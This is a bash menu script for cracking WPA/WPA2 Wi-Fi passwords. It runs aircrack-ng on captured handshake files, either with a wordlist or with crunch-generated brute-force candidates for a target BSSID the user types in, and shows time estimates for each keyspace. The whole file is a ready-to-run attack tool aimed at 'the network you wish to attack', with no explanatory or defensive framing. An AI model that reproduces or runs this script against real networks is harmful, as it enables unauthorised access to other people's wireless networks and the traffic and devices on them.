#!/bin/bash

clear
echo ""

#Configuration:

HANDSHAKE='/root/Handshakes/HandShake*.cap'
WORDLIST='/home/freeman/.wordlists/list1.txt'
MONITER=mon0

#End configuration

while true
do
clear
echo "*****************************************************"
echo "*******************Select option*********************"
echo "*****************************************************"
echo "**                                                 **"
echo "** 1. View handshakes             (Ctrl-C to exit) **"
echo "** 2. Use WORDLIST                                 **"
echo "** 3. Bruteforce 8 numeric        (1 day 6 hrs)    **"
echo "** 4. Bruteforce 9 numeric        (12 days)        **"
echo "** 5. Bruteforce 10 numeric       (4 months)       **"
echo "** 6. Bruteforce 8 a-z            (7 years)        **"
echo "** 7. Bruteforce 8 A-Z            (7 years)        **"
echo "** 8. Bruteforce 8 a-z + numeric  (91 years)       **"
echo "** 9. Bruteforce 8 A-Z + numeric  (91 years)       **"
echo "** 10. Bruteforce 8 a-z + A-Z     (1719 years)     **"
echo "** 11. Bruteforce custom          (???)            **"
echo "**                                                 **"
echo "*****************************************************"
echo "**********All calculations done @1000 pmk/s**********"
echo "*****************************************************"
echo ""

read n
case $n in
1)(xterm -hold -e aircrack-ng $HANDSHAKE) & ;;

2)clear
##echo "Decompressing rockyou.txt..."
##gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
##echo ""
##sleep 2
echo "Starting attack..."
sleep 3
aircrack-ng -w $WORDLIST $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

3)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 numeric"
echo ""
crunch 8 8 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

4)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 9 numeric"
echo ""
crunch 9 9 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

5)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 10 numeric"
echo ""
crunch 10 10 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

6)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyz|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

7)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 A-Z"
echo ""
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

8)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z numeric"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

9)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 A-Z numeric"
echo ""
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

10)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z A-Z"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

11)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "What arguments would you like to pass to crunch?"
echo ""
read CRUNCH
[[ $CRUNCH == "" ]]
echo ""
echo "Starting custom bruteforce attack"
echo ""
crunch $CRUNCH|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

*)clear
echo "Invalid option"
echo ""
read -p "Press any key to return to script";;

esac
sleep 1
done